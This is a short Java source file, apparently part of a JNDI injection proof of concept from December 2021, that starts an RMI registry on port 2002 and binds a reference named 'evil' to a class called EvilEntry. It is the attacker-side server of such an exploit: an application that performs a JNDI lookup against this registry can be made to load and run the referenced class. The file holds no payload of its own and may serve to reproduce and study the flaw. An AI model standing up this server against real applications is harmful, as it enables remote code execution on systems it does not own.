package com.example.bug.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author shichao
 * @since 2021/12/11 12:10
 **/
public class RmiServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        int port = 2002;
        Registry registry = LocateRegistry.createRegistry(port);
        System.out.println("Start rmi in port:" + port);
        Reference reference = new Reference("com.example.bug.rmi.EvilEntry", "com.example.bug.rmi.EvilEntry", null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("evil", referenceWrapper);
    }
}
